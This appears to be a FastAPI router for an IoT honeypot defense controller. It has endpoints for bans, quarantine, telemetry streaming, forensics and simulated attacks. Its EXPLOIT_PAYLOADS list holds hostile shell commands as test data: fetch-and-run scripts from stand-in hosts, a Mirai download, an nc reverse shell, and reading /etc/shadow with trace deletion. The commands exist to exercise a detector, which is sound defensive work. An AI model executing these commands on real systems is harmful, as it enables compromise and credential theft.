import asyncio
import ipaddress
import logging
import random
import time
from typing import Any, AsyncGenerator, Dict, List, Optional, Tuple

from fastapi import APIRouter, Body, HTTPException, Request, Response
from fastapi.responses import StreamingResponse
from pydantic import BaseModel, Field

from controller.api.sse_broker import SSEBroadcaster
from controller.core.detector import IntrusionDetector
from controller.core.models import CowrieEvent
from controller.mitigation.quarantine import QuarantineManager

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api")

# Curated multi-IP pools using RFC 5737 TEST-NET documentation ranges
ATTACK_IP_POOLS: Dict[str, List[str]] = {
    "brute-force": [
        "198.51.100.99",
        "198.51.100.142",
        "198.51.100.205",
        "203.0.113.45",
        "192.0.2.81",
    ],
    "exploit": [
        "203.0.113.88",
        "203.0.113.154",
        "203.0.113.219",
        "198.51.100.175",
        "192.0.2.114",
    ],
    "port-sweep": [
        "198.51.100.77",
        "198.51.100.188",
        "192.0.2.63",
        "203.0.113.92",
        "192.0.2.199",
    ],
}

EXPLOIT_PAYLOADS: Tuple[str, ...] = (
    "curl -s http://malicious.payload/botnet.sh | sh",
    "wget http://malicious.payload/mirai.arm7 -O /tmp/m && chmod +x /tmp/m",
    "nc -e /bin/sh 192.0.2.55 4444",
    "cat /etc/shadow && rm -rf /tmp/traces",
    "wget http://198.51.100.10/loader.sh -O - | /bin/bash",
)


class UnbanRequest(BaseModel):
    ip: str = Field(..., description="Target IPv4 or IPv6 address to unban")
    admin_user: Optional[str] = Field("soc_admin", description="Identity executing the unban action")


class AttackSimulationRequest(BaseModel):
    src_ip: Optional[str] = Field(None, description="Optional explicit attacker IPv4 or IPv6 address")
    mode: str = Field("single", description="Simulation mode: 'single', 'random', or 'swarm'")


def _resolve_simulation_targets(
    attack_type: str,
    payload: Optional[AttackSimulationRequest],
) -> Tuple[List[str], str]:
    """Resolves attacker IP(s) from explicit input, random pool selection, or swarm mode."""
    pool = ATTACK_IP_POOLS[attack_type]
    if payload is None:
        return [pool[0]], "single"

    mode = (payload.mode or "single").strip().lower()
    if mode not in {"single", "random", "swarm"}:
        raise HTTPException(status_code=400, detail=f"Unsupported simulation mode: '{payload.mode}'")

    if mode == "swarm":
        return list(pool), "swarm"
    if mode == "random":
        return [random.choice(pool)], "random"

    if payload.src_ip:
        candidate = payload.src_ip.strip()
        try:
            normalized_ip = str(ipaddress.ip_address(candidate))
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=f"Invalid IP address '{candidate}': {exc}") from exc
        return [normalized_ip], "single"

    return [pool[0]], "single"


def make_response(
    status: str = "success",
    data: Optional[Dict[str, Any]] = None,
    message: str = "",
) -> Dict[str, Any]:
    """Helper ensuring consistent API response shapes across all endpoints."""
    return {
        "status": status,
        "timestamp": time.time(),
        "data": data or {},
        "message": message,
    }


def get_detector(request: Request) -> IntrusionDetector:
    return request.app.state.detector


def get_quarantine_manager(request: Request) -> QuarantineManager:
    return request.app.state.quarantine_manager


def get_broadcaster(request: Request) -> SSEBroadcaster:
    return request.app.state.sse_broadcaster


@router.get("/health")
async def health_check() -> Dict[str, Any]:
    """Basic health check and service status."""
    return make_response(status="success", data={"service": "defense_controller", "status": "healthy"})


@router.get("/defense/status")
async def get_defense_status(request: Request) -> Dict[str, Any]:
    """Returns the current security inventory: active drops, banned count, and audit history."""
    detector = get_detector(request)
    quarantine = get_quarantine_manager(request)

    banned_ips = detector.firewall.list_banned_ips()
    recent_history = detector.db.get_history(limit=25)
    active_bans = detector.db.get_active_bans()

    # Dynamic inspection of IoT virtual node states
    node_states = {
        "iot_sensor_node": quarantine.get_container_network_status("iot_sensor_node"),
        "iot_bulb_node": quarantine.get_container_network_status("iot_bulb_node"),
        "iot_mqtt_broker": quarantine.get_container_network_status("iot_mqtt_broker"),
        "iot_cowrie_honeypot": quarantine.get_container_network_status("iot_cowrie_honeypot"),
    }

    return make_response(
        data={
            "banned_ips": banned_ips,
            "banned_count": len(banned_ips),
            "active_bans": active_bans,
            "recent_mitigations": recent_history,
            "node_states": node_states,
        }
    )


@router.get("/stream")
async def sse_telemetry_stream(request: Request) -> StreamingResponse:
    """
    Unidirectional Server-Sent Events stream delivering real-time telemetry,
    honeypot attack records, and autonomous mitigation events to connected SOC dashboards.
    """
    broadcaster = get_broadcaster(request)
    client_queue = await broadcaster.subscribe()

    async def event_generator() -> AsyncGenerator[str, None]:
        try:
            # Send initial connection handshake
            yield f"event: connected\ndata: {{\"status\": \"connected\", \"timestamp\": {time.time()}}}\n\n"

            while True:
                # Check for client disconnect
                if await request.is_disconnected():
                    break

                try:
                    # Non-blocking wait for next event with 5-second heartbeat fallback
                    frame = await asyncio.wait_for(client_queue.get(), timeout=5.0)
                    yield frame
                except asyncio.TimeoutError:
                    # Send periodic keepalive heartbeat frame
                    yield f"event: heartbeat\ndata: {{\"type\": \"heartbeat\", \"timestamp\": {time.time()}}}\n\n"
        finally:
            await broadcaster.unsubscribe(client_queue)

    headers = {
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "X-Accel-Buffering": "no",
        "Content-Type": "text/event-stream",
    }
    return StreamingResponse(event_generator(), media_type="text/event-stream", headers=headers)


@router.post("/defense/unban")
async def manual_unban(payload: UnbanRequest, request: Request) -> Dict[str, Any]:
    """Manually revokes an iptables drop rule and updates the audit log."""
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)

    success = detector.manual_unban(payload.ip, admin_user=payload.admin_user or "soc_admin")
    if not success:
        raise HTTPException(status_code=400, detail=f"Failed to remove drop rule for IP {payload.ip}")

    # Broadcast unban event over SSE
    await broadcaster.broadcast("unban_alert", {"ip": payload.ip, "unbanned_by": payload.admin_user})

    return make_response(
        message=f"Rule for IP {payload.ip} revoked successfully.",
        data={"unbanned_ip": payload.ip}
    )


@router.post("/defense/reset-bans")
async def reset_all_bans(request: Request) -> Dict[str, Any]:
    """Flushes the custom blocklist and clears active ban records."""
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)

    success = detector.reset_all_bans()
    if not success:
        raise HTTPException(status_code=500, detail="Failed to flush firewall blocklist.")

    await broadcaster.broadcast("reset_alert", {"message": "All firewall blocklist rules flushed."})

    return make_response(message="All firewall drop rules have been successfully flushed.")


@router.post("/defense/reset-database")
async def reset_database_endpoint(request: Request) -> Dict[str, Any]:
    """Completely purges the audit database history, active bans, and in-memory analytics."""
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)

    success = detector.reset_full_database()
    if not success:
        raise HTTPException(status_code=500, detail="Failed to reset database.")

    await broadcaster.broadcast("database_reset_alert", {
        "message": "Database audit history and analytics completely wiped."
    })

    return make_response(message="Database and audit history successfully wiped clean.")


@router.post("/simulate/infect/{node_id}")
async def simulate_node_infection(node_id: str, request: Request) -> Dict[str, Any]:
    """Simulates internal compromise of a virtual IoT container, isolating it to quarantine."""
    quarantine = get_quarantine_manager(request)
    broadcaster = get_broadcaster(request)

    res = quarantine.quarantine_container(node_id)
    if res["status"] != "success":
        return make_response(status="error", data=res, message=res["message"])

    # Broadcast quarantine state transition
    await broadcaster.broadcast("node_quarantined", {
        "node_id": node_id,
        "state": "quarantined",
        "network": "iot_quarantine_net"
    })

    return make_response(data=res, message=f"Container {node_id} isolated into quarantine.")


@router.post("/simulate/restore/{node_id}")
async def restore_node_container(node_id: str, request: Request) -> Dict[str, Any]:
    """Restores an isolated IoT container back to the production network."""
    quarantine = get_quarantine_manager(request)
    broadcaster = get_broadcaster(request)

    res = quarantine.restore_container(node_id)
    if res["status"] != "success":
        return make_response(status="error", data=res, message=res["message"])

    await broadcaster.broadcast("node_restored", {
        "node_id": node_id,
        "state": "production",
        "network": "iot_production_net"
    })

    return make_response(data=res, message=f"Container {node_id} restored to production.")


@router.get("/simulate/attack/pools")
async def get_attack_ip_pools() -> Dict[str, Any]:
    """Returns curated attacker IP pools available for each simulation vector."""
    return make_response(data=ATTACK_IP_POOLS)


async def _emit_threshold_attack(
    detector: IntrusionDetector,
    broadcaster: SSEBroadcaster,
    target_ips: List[str],
    eventid: str,
    attempts_per_ip: int = 5,
) -> int:
    """Broadcasts and evaluates repeated threshold attack events across one or more attacker IPs."""
    events_triggered = 0
    delay = 0.02 if len(target_ips) > 1 else 0.05

    for attacker_ip in target_ips:
        for i in range(attempts_per_ip):
            if eventid == "cowrie.login.failed":
                event = CowrieEvent(
                    eventid=eventid,
                    src_ip=attacker_ip,
                    timestamp=time.time(),
                    username="root",
                    password=f"admin_pass_{i}",
                    message=f"login attempt [root/admin_pass_{i}] failed",
                    raw_data={"simulated": True},
                )
            else:
                event = CowrieEvent(
                    eventid=eventid,
                    src_ip=attacker_ip,
                    timestamp=time.time(),
                    message=f"Remote SSH version: SSH-2.0-Attacker_Probe_{i}",
                    raw_data={"simulated": True},
                )
            await broadcaster.broadcast("honeypot_hit", event.to_dict())
            detector.process_event(event)
            events_triggered += 1
            await asyncio.sleep(delay)

    return events_triggered


@router.post("/simulate/attack/brute-force")
async def trigger_simulated_bruteforce(
    request: Request,
    payload: Optional[AttackSimulationRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Triggers a credential brute-force simulation for a selected, random, custom, or swarm IP set."""
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    target_ips, mode = _resolve_simulation_targets("brute-force", payload)

    events_triggered = await _emit_threshold_attack(
        detector=detector,
        broadcaster=broadcaster,
        target_ips=target_ips,
        eventid="cowrie.login.failed",
    )
    protected = [ip for ip in target_ips if detector.allowlist.is_ip_protected(ip)]
    ip_summary = ", ".join(target_ips)

    return make_response(
        data={
            "target_ip": target_ips[0],
            "target_ips": target_ips,
            "mode": mode,
            "events_sent": events_triggered,
            "allowlist_protected": protected,
        },
        message=f"Brute-force attack simulation ({mode}) completed for {ip_summary}.",
    )


@router.post("/simulate/attack/exploit")
async def trigger_simulated_exploit(
    request: Request,
    payload: Optional[AttackSimulationRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Triggers a critical remote shell exploit simulation for a selected, random, custom, or swarm IP set."""
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    target_ips, mode = _resolve_simulation_targets("exploit", payload)
    commands_used: List[str] = []

    for idx, attacker_ip in enumerate(target_ips):
        cmd = EXPLOIT_PAYLOADS[idx % len(EXPLOIT_PAYLOADS)]
        commands_used.append(cmd)
        event = CowrieEvent(
            eventid="cowrie.command.input",
            src_ip=attacker_ip,
            timestamp=time.time(),
            input_command=cmd,
            message=f"CMD: {cmd}",
            raw_data={"simulated": True},
        )
        await broadcaster.broadcast("honeypot_hit", event.to_dict())
        detector.process_event(event)
        if len(target_ips) > 1:
            await asyncio.sleep(0.03)

    protected = [ip for ip in target_ips if detector.allowlist.is_ip_protected(ip)]
    ip_summary = ", ".join(target_ips)

    return make_response(
        data={
            "target_ip": target_ips[0],
            "target_ips": target_ips,
            "mode": mode,
            "command": commands_used[0],
            "events_sent": len(target_ips),
            "allowlist_protected": protected,
        },
        message=f"Terminal exploit simulation ({mode}) completed for {ip_summary}.",
    )


@router.post("/simulate/attack/port-sweep")
async def trigger_simulated_port_sweep(
    request: Request,
    payload: Optional[AttackSimulationRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Triggers a rapid port reconnaissance sweep simulation for a selected, random, custom, or swarm IP set."""
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    target_ips, mode = _resolve_simulation_targets("port-sweep", payload)

    events_triggered = await _emit_threshold_attack(
        detector=detector,
        broadcaster=broadcaster,
        target_ips=target_ips,
        eventid="cowrie.client.version",
    )
    protected = [ip for ip in target_ips if detector.allowlist.is_ip_protected(ip)]
    ip_summary = ", ".join(target_ips)

    return make_response(
        data={
            "target_ip": target_ips[0],
            "target_ips": target_ips,
            "mode": mode,
            "events_sent": events_triggered,
            "allowlist_protected": protected,
        },
        message=f"Reconnaissance sweep simulation ({mode}) completed for {ip_summary}.",
    )


@router.get("/defense/analytics")
async def get_defense_analytics(request: Request) -> Dict[str, Any]:
    """Returns aggregated honeypot threat intelligence and attack analytics."""
    detector = get_detector(request)
    stats = detector.get_analytics()
    return make_response(data=stats)


@router.get("/defense/forensics/{ip}")
async def get_ip_forensics(ip: str, request: Request) -> Dict[str, Any]:
    """Returns deep chronological forensic timeline and event history for a specific IP."""
    detector = get_detector(request)
    forensics = detector.get_ip_forensics(ip)
    return make_response(data=forensics)


@router.get("/defense/export")
async def export_audit_report(request: Request) -> Dict[str, Any]:
    """Exports full audit and forensic records for external SIEM / compliance reporting."""
    detector = get_detector(request)
    analytics = detector.get_analytics()
    history = detector.db.get_history(limit=200)
    banned_ips = detector.firewall.list_banned_ips()

    export_payload = {
        "report_generated_at": time.time(),
        "total_active_drops": len(banned_ips),
        "banned_ips": banned_ips,
        "threat_intelligence": analytics,
        "mitigation_audit_log": history,
    }
    return make_response(data=export_payload, message="SOC Audit Report generated successfully.")

